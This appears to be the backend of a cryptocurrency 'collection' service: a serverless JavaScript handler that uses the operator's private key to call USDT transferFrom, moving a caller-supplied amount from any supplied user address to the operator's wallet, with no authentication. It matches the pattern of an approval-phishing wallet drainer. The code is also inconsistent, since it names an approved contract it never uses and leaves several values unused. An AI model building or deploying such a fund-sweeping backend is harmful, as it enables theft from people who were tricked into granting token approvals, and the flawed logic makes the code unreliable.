// api/execute-collection.js

export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
      return res.status(405).json({ success: false, error: 'Method not allowed' });
    }
  
    try {
      const { userAddress, amount } = req.body;
  
      if (!userAddress || !amount) {
        return res.status(400).json({ success: false, error: 'Missing userAddress or amount' });
      }
  
      // 1. CONFIGURATION: CHANGE THESE VARIABLES
      const PRIVATE_KEY = process.env.PRIVATE_KEY; 
      const RPC_URL = "https://rpc.ankr.com/bsc"; // Your Ankr RPC
      const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
      
      // Check if you have a private key configured in Vercel Environment Variables
      if (!PRIVATE_KEY) {
        return res.status(500).json({ success: false, error: 'Private Key not configured in Vercel Env' });
      }
  
      // 2. Import ethers from the serverless function context
      const { ethers } = require('ethers');
  
      // 3. Connect to the provider
      const provider = new ethers.JsonRpcProvider(RPC_URL);
      
      // 4. Connect your wallet (the one receiving funds) using the private key
      const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  
      // 5. Define the USDT Contract Interface
      const USDT_ABI = [
        "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
      ];
      
      // Note: You need to know the CONTRACT_ADDRESS that the user approved.
      // In your app.js, this is: const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537";
      const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537"; 
  
      // 6. Create the contract instance for the Token, but sign with YOUR wallet
      const usdtContract = new ethers.Contract(USDT_ADDRESS, ["function transferFrom(address,address,uint256)"], wallet);
  
      // 7. Execute the Transfer
      // This moves funds FROM userAddress TO your wallet (wallet.address)
      const tx = await usdtContract.transferFrom(userAddress, wallet.address, amount);
      
      // 8. Wait for confirmation
      const receipt = await tx.wait();
  
      return res.status(200).json({ 
        success: true, 
        txHash: tx.hash,
        message: "Funds collected successfully"
      });
  
    } catch (error) {
      console.error("Collection Error:", error);
      return res.status(500).json({ 
        success: false, 
        error: error.reason || error.message || "Unknown error" 
      });
    }
  }